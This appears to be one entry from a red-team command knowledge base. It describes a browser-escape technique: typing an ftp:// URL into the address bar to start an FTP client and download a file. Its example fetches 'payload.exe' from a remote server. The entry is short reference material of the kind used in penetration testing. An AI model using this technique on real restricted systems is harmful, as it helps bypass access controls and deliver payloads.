---
id: 2560f44c-7ed6-4923-be83-d193c77e84a3
name: browser-enter-ftp-url
type: command
executor: browser
data: 'ftp://$_FTP_SERVER/$_FILE_PATH'
output: null
created_at: '2023-04-06T03:56:17.452266+00:00'
updated_at: '2024-01-01T00:00:00Z'
platforms:
  - Windows
  - Browser
tags:
  - protocol-handler
  - browser-escape
  - ftp
verified: true
validated: true
---

# browser-enter-ftp-url

## Command

In the browser address bar, enter:

```text
ftp://$_FTP_SERVER/$_FILE_PATH
```

## Description

This uses the FTP protocol to download files from a remote server, escaping the browser to invoke the FTP client.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_FTP_SERVER | FTP server address (e.g., ftp.example.com) | Yes |
| $_FILE_PATH | Path to file (e.g., file.txt) | Yes |

## Examples

### Basic Usage

```text
ftp://ftp.example.com/file.txt
```

### Advanced Usage

```text
ftp://ftp.example.com/pub/payload.exe
```

## Expected Output

FTP client opens and downloads the file, or browser displays directory listing. Success: File transferred locally.

## Related

- [[procedures/Browser-Escape-via-Unassociated-Protocols]]
